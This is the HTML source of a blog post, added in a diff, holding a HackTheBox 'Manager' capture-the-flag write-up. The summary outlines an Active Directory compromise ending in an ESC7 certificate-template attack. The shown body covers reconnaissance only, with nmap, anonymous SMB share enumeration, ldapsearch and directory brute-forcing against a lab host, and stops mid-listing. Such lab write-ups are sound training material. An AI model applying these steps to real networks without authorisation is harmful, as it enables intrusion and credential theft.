@@ -1,0 +1,1777 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Manager is a medium difficulty box relying on Active Directory. We can discover common usernames in use by utilizing Kerbrute with a general username list. The service account Operator has been set up with a weak password that can be easily guessed. Upon authenticating to the MSSQL service using the operator account, we can enumerate the filesystem with xp_dirtree and find a critical backup zip is insecurely placed in the web filesystem, allowing us to access and download directly. We can log on remotely with credentials placed in the backup, and use bloodhound for enumeration. Our compromised user is in a group associated with the AD Certificate Services, and using certipy we discover a template attack we might use to acquire Administrator credentials.">
+<title>HackTheBox - Manager</title>
+
+<link rel='canonical' href='http://localhost:1313/p/hackthebox-manager/'>
+
+<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="HackTheBox - Manager">
+<meta property='og:description' content="Manager is a medium difficulty box relying on Active Directory. We can discover common usernames in use by utilizing Kerbrute with a general username list. The service account Operator has been set up with a weak password that can be easily guessed. Upon authenticating to the MSSQL service using the operator account, we can enumerate the filesystem with xp_dirtree and find a critical backup zip is insecurely placed in the web filesystem, allowing us to access and download directly. We can log on remotely with credentials placed in the backup, and use bloodhound for enumeration. Our compromised user is in a group associated with the AD Certificate Services, and using certipy we discover a template attack we might use to acquire Administrator credentials.">
+<meta property='og:url' content='http://localhost:1313/p/hackthebox-manager/'>
+<meta property='og:site_name' content='Spencer&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Active Directory' /><meta property='article:tag' content='Kerbrute' /><meta property='article:tag' content='MSSQL' /><meta property='article:tag' content='Bloodhound' /><meta property='article:tag' content='Active Directory Certificate Services' /><meta property='article:tag' content='certipy' /><meta property='article:published_time' content='2024-03-16T06:05:15-06:00'/><meta property='article:modified_time' content='2024-03-16T06:05:15-06:00'/><meta property='og:image' content='http://localhost:1313/p/hackthebox-manager/Manager.png' />
+<meta name="twitter:title" content="HackTheBox - Manager">
+<meta name="twitter:description" content="Manager is a medium difficulty box relying on Active Directory. We can discover common usernames in use by utilizing Kerbrute with a general username list. The service account Operator has been set up with a weak password that can be easily guessed. Upon authenticating to the MSSQL service using the operator account, we can enumerate the filesystem with xp_dirtree and find a critical backup zip is insecurely placed in the web filesystem, allowing us to access and download directly. We can log on remotely with credentials placed in the backup, and use bloodhound for enumeration. Our compromised user is in a group associated with the AD Certificate Services, and using certipy we discover a template attack we might use to acquire Administrator credentials."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='http://localhost:1313/p/hackthebox-manager/Manager.png' />
+    <link rel="shortcut icon" href="/favicon.png" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu897059592634026878.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Spencer&#39;s Blog</a></h1>
+            <h2 class="site-description">Lorem ipsum dolor sit amet, consectetur adipiscing elit.</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/post' >
+                
+                
+                
+                <span>Posts</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/awards' >
+                
+                
+                
+                <span>Trophy Room</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#enumeration">Enumeration</a>
+      <ol>
+        <li><a href="#probing-active-directory">Probing Active Directory</a></li>
+        <li><a href="#enumerating-the-website">Enumerating The Website</a></li>
+        <li><a href="#returning-to-active-directory-attacks">Returning to Active Directory Attacks</a></li>
+      </ol>
+    </li>
+    <li><a href="#foothold">Foothold</a>
+      <ol>
+        <li><a href="#enumeration-through-mssql">Enumeration through MSSQL</a></li>
+        <li><a href="#enumerating-the-web-server-filesystem">Enumerating The Web Server Filesystem</a></li>
+      </ol>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a>
+      <ol>
+        <li><a href="#active-directory-enumeration-via-bloodhound">Active Directory Enumeration via Bloodhound</a>
+          <ol>
+            <li><a href="#running-sharphound">Running SharpHound</a></li>
+            <li><a href="#initializing-bloodhound">Initializing BloodHound</a></li>
+            <li><a href="#raven-is-a-member-of-certificate-service-dcom-access">Raven is a member of Certificate Service Dcom Access</a></li>
+          </ol>
+        </li>
+        <li><a href="#exploiting-ad-certificate-services">Exploiting AD Certificate Services</a>
+          <ol>
+            <li><a href="#using-esc7-attack-2">Using ESC7 attack #2:</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/hackthebox-manager/">
+                <img src="/p/hackthebox-manager/Manager_hu12369820072944438804.png"
+                        srcset="/p/hackthebox-manager/Manager_hu12369820072944438804.png 800w, /p/hackthebox-manager/Manager_hu15330004459932630963.png 1600w"
+                        width="800" 
+                        height="606" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Manager" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/hack-the-box/" >
+                Hack the Box
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/hackthebox-manager/">HackTheBox - Manager</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            Manager is a medium difficulty box relying on Active Directory. We can discover common usernames in use by utilizing Kerbrute with a general username list. The service account Operator has been set up with a weak password that can be easily guessed. Upon authenticating to the MSSQL service using the operator account, we can enumerate the filesystem with xp_dirtree and find a critical backup zip is insecurely placed in the web filesystem, allowing us to access and download directly. We can log on remotely with credentials placed in the backup, and use bloodhound for enumeration. Our compromised user is in a group associated with the AD Certificate Services, and using certipy we discover a template attack we might use to acquire Administrator credentials.
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Mar 16, 2024</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    16 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="enumeration">Enumeration
+</h2><p>Initial nmap:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Nmap scan report for 10.10.11.236
+</span></span><span class="line"><span class="cl">Host is up (0.047s latency).
+</span></span><span class="line"><span class="cl">Not shown: 987 filtered tcp ports (no-response)
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE       VERSION
+</span></span><span class="line"><span class="cl">53/tcp   open  domain        Simple DNS Plus
+</span></span><span class="line"><span class="cl">80/tcp   open  http          Microsoft IIS httpd 10.0
+</span></span><span class="line"><span class="cl">| http-methods: 
+</span></span><span class="line"><span class="cl">|_  Potentially risky methods: TRACE
+</span></span><span class="line"><span class="cl">|_http-title: Manager
+</span></span><span class="line"><span class="cl">|_http-server-header: Microsoft-IIS/10.0
+</span></span><span class="line"><span class="cl">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-10-23 06:29:34Z)
+</span></span><span class="line"><span class="cl">135/tcp  open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
+</span></span><span class="line"><span class="cl">| ssl-cert: Subject: commonName=dc01.manager.htb
+</span></span><span class="line"><span class="cl">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb
+</span></span><span class="line"><span class="cl">| Not valid before: 2023-07-30T13:51:28
+</span></span><span class="line"><span class="cl">|_Not valid after:  2024-07-29T13:51:28
+</span></span><span class="line"><span class="cl">|_ssl-date: 2023-10-23T06:30:56+00:00; +6h59m59s from scanner time.
+</span></span><span class="line"><span class="cl">445/tcp  open  microsoft-ds?
+</span></span><span class="line"><span class="cl">464/tcp  open  kpasswd5?
+</span></span><span class="line"><span class="cl">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
+</span></span><span class="line"><span class="cl">|_ssl-date: 2023-10-23T06:30:56+00:00; +7h00m00s from scanner time.
+</span></span><span class="line"><span class="cl">| ssl-cert: Subject: commonName=dc01.manager.htb
+</span></span><span class="line"><span class="cl">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb
+</span></span><span class="line"><span class="cl">| Not valid before: 2023-07-30T13:51:28
+</span></span><span class="line"><span class="cl">|_Not valid after:  2024-07-29T13:51:28
+</span></span><span class="line"><span class="cl">1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
+</span></span><span class="line"><span class="cl">| ms-sql-ntlm-info: 
+</span></span><span class="line"><span class="cl">|   10.10.11.236:1433: 
+</span></span><span class="line"><span class="cl">|     Target_Name: MANAGER
+</span></span><span class="line"><span class="cl">|     NetBIOS_Domain_Name: MANAGER
+</span></span><span class="line"><span class="cl">|     NetBIOS_Computer_Name: DC01
+</span></span><span class="line"><span class="cl">|     DNS_Domain_Name: manager.htb
+</span></span><span class="line"><span class="cl">|     DNS_Computer_Name: dc01.manager.htb
+</span></span><span class="line"><span class="cl">|     DNS_Tree_Name: manager.htb
+</span></span><span class="line"><span class="cl">|_    Product_Version: 10.0.17763
+</span></span><span class="line"><span class="cl">|_ssl-date: 2023-10-23T06:30:55+00:00; +6h59m59s from scanner time.
+</span></span><span class="line"><span class="cl">| ms-sql-info: 
+</span></span><span class="line"><span class="cl">|   10.10.11.236:1433: 
+</span></span><span class="line"><span class="cl">|     Version: 
+</span></span><span class="line"><span class="cl">|       name: Microsoft SQL Server 2019 RTM
+</span></span><span class="line"><span class="cl">|       number: 15.00.2000.00
+</span></span><span class="line"><span class="cl">|       Product: Microsoft SQL Server 2019
+</span></span><span class="line"><span class="cl">|       Service pack level: RTM
+</span></span><span class="line"><span class="cl">|       Post-SP patches applied: false
+</span></span><span class="line"><span class="cl">|_    TCP port: 1433
+</span></span><span class="line"><span class="cl">| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+</span></span><span class="line"><span class="cl">| Not valid before: 2023-10-23T05:24:57
+</span></span><span class="line"><span class="cl">|_Not valid after:  2053-10-23T05:24:57
+</span></span><span class="line"><span class="cl">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
+</span></span><span class="line"><span class="cl">|_ssl-date: 2023-10-23T06:30:56+00:00; +6h59m59s from scanner time.
+</span></span><span class="line"><span class="cl">| ssl-cert: Subject: commonName=dc01.manager.htb
+</span></span><span class="line"><span class="cl">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb
+</span></span><span class="line"><span class="cl">| Not valid before: 2023-07-30T13:51:28
+</span></span><span class="line"><span class="cl">|_Not valid after:  2024-07-29T13:51:28
+</span></span><span class="line"><span class="cl">3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
+</span></span><span class="line"><span class="cl">| ssl-cert: Subject: commonName=dc01.manager.htb
+</span></span><span class="line"><span class="cl">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb
+</span></span><span class="line"><span class="cl">| Not valid before: 2023-07-30T13:51:28
+</span></span><span class="line"><span class="cl">|_Not valid after:  2024-07-29T13:51:28
+</span></span><span class="line"><span class="cl">|_ssl-date: 2023-10-23T06:30:56+00:00; +7h00m00s from scanner time.
+</span></span><span class="line"><span class="cl">Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl">| smb2-time: 
+</span></span><span class="line"><span class="cl">|   date: 2023-10-23T06:30:14
+</span></span><span class="line"><span class="cl">|_  start_date: N/A
+</span></span><span class="line"><span class="cl">|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m58s
+</span></span><span class="line"><span class="cl">| smb2-security-mode: 
+</span></span><span class="line"><span class="cl">|   3:1:1: 
+</span></span><span class="line"><span class="cl">|_    Message signing enabled and required
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap done: 1 IP address (1 host up) scanned in 95.40 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>From the nmap scanning, we can see this is a domain controller for Active Directory. There are a lot of open ports associated with active directory (ldap, smb, rpc) so we have a wide attack surface to work with.</p>
+<h3 id="probing-active-directory">Probing Active Directory
+</h3><p>Firstly checking SMB for anonymous authentication:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~]
+</span></span><span class="line"><span class="cl">└─$ cme smb 10.10.11.236 -u &#39;Anonymous&#39; -p &#39;&#39; --shares
+</span></span><span class="line"><span class="cl">SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
+</span></span><span class="line"><span class="cl">SMB         10.10.11.236    445    DC01             [+] manager.htb\Anonymous: 
+</span></span><span class="line"><span class="cl">SMB         10.10.11.236    445    DC01             [+] Enumerated shares
+</span></span><span class="line"><span class="cl">SMB         10.10.11.236    445    DC01             Share           Permissions     Remark
+</span></span><span class="line"><span class="cl">SMB         10.10.11.236    445    DC01             -----           -----------     ------
+</span></span><span class="line"><span class="cl">SMB         10.10.11.236    445    DC01             ADMIN$                          Remote Admin
+</span></span><span class="line"><span class="cl">SMB         10.10.11.236    445    DC01             C$                              Default share
+</span></span><span class="line"><span class="cl">SMB         10.10.11.236    445    DC01             IPC$            READ            Remote IPC
+</span></span><span class="line"><span class="cl">SMB         10.10.11.236    445    DC01             NETLOGON                        Logon server share 
+</span></span><span class="line"><span class="cl">SMB         10.10.11.236    445    DC01             SYSVOL                          Logon server share
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Anonymous authentication is allowed, but there are no interesting shares to explore. Next, I see what public data I can see through ldap without credentials:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/manager]
+</span></span><span class="line"><span class="cl">└─$ ldapsearch -v -x -b &#34;DC=manager,DC=htb&#34; -H &#34;ldap://10.10.11.236&#34; &#34;(objectclass=*)&#34;
+</span></span><span class="line"><span class="cl">ldap_initialize( ldap://10.10.11.236:389/??base )
+</span></span><span class="line"><span class="cl">filter: (objectclass=*)
+</span></span><span class="line"><span class="cl">requesting: All userApplication attributes
+</span></span><span class="line"><span class="cl"># extended LDIF
+</span></span><span class="line"><span class="cl">#
+</span></span><span class="line"><span class="cl"># LDAPv3
+</span></span><span class="line"><span class="cl"># base &lt;DC=manager,DC=htb&gt; with scope subtree
+</span></span><span class="line"><span class="cl"># filter: (objectclass=*)
+</span></span><span class="line"><span class="cl"># requesting: ALL
+</span></span><span class="line"><span class="cl">#
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># search result
+</span></span><span class="line"><span class="cl">search: 2
+</span></span><span class="line"><span class="cl">result: 1 Operations error
+</span></span><span class="line"><span class="cl">text: 000004DC: LdapErr: DSID-0C090CF4, comment: In order to perform this opera
+</span></span><span class="line"><span class="cl"> tion a successful bind must be completed on the connection., data 0, v4563
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># numResponses: 1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Once again, there is no more interesting information. Since there is a web page open on port 80, I decided to take a look at the website.</p>
+<h3 id="enumerating-the-website">Enumerating The Website
+</h3><p><img src="/p/hackthebox-manager/Images/landingpage.png"
+	width="1198"
+	height="571"
+	srcset="/p/hackthebox-manager/Images/landingpage_hu9984910990627510565.png 480w, /p/hackthebox-manager/Images/landingpage_hu6432412787970967267.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="209"
+		data-flex-basis="503px"
+	
+>
+The web page is a static html. Checking the other listed pages also only shows html pages, so I look into directory brute forcing:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/manager]
+</span></span><span class="line"><span class="cl">└─$ cat tcp_80_http_feroxbuster_dirbuster.txt | grep 200
+</span></span><span class="line"><span class="cl">200      GET       14l       48w     3837c http://manager.htb/images/logo.png
+</span></span><span class="line"><span class="cl">200      GET        9l       41w     2465c http://manager.htb/images/s-4.png
+</span></span><span class="line"><span class="cl">200      GET       85l      128w     1389c http://manager.htb/css/responsive.css
+</span></span><span class="line"><span class="cl">200      GET        6l       17w     1553c http://manager.htb/images/s-1.png
+</span></span><span class="line"><span class="cl">200      GET        6l       20w     1360c http://manager.htb/images/location-o.png
+</span></span><span class="line"><span class="cl">200      GET      157l      414w     5386c http://manager.htb/about.html
+</span></span><span class="line"><span class="cl">200      GET       82l      542w    56157c http://manager.htb/images/contact-img.jpg
+</span></span><span class="line"><span class="cl">200      GET        4l       20w     1337c http://manager.htb/images/s-2.png
+</span></span><span class="line"><span class="cl">200      GET      149l      630w    53431c http://manager.htb/images/client.jpg
+</span></span><span class="line"><span class="cl">200      GET       10l       43w     2023c http://manager.htb/images/call.png
+</span></span><span class="line"><span class="cl">200      GET        9l       31w     2492c http://manager.htb/images/s-3.png
+</span></span><span class="line"><span class="cl">200      GET      614l     1154w    11838c http://manager.htb/css/style.css
+</span></span><span class="line"><span class="cl">200      GET     4437l    10999w   131863c http://manager.htb/js/bootstrap.js
+</span></span><span class="line"><span class="cl">200      GET        6l       22w     1052c http://manager.htb/images/location.png
+</span></span><span class="line"><span class="cl">200      GET        9l       25w     1255c http://manager.htb/images/envelope.png
+</span></span><span class="line"><span class="cl">200      GET      224l      650w     7900c http://manager.htb/service.html
+</span></span><span class="line"><span class="cl">200      GET      165l      367w     5317c http://manager.htb/contact.html
+</span></span><span class="line"><span class="cl">200      GET      507l     1356w    18203c http://manager.htb/index.html
+</span></span><span class="line"><span class="cl">200      GET       10l       42w     2704c http://manager.htb/images/call-o.png
+</span></span><span class="line"><span class="cl">200      GET    10038l    19587w   192348c http://manager.htb/css/bootstrap.css
+</span></span><span class="line"><span class="cl">200      GET        2l     1276w    88145c http://manager.htb/js/jquery-3.4.1.min.js
+</span></span><span class="line"><span class="cl">200      GET     1313l     7384w   563817c http://manager.htb/images/about-img.png
+</span></span><span class="line"><span class="cl">200      GET        7l       29w     1606c http://manager.htb/images/envelope-o.png
+</span></span><span class="line"><span class="cl">200      GET      507l     1356w    18203c http://manager.htb/
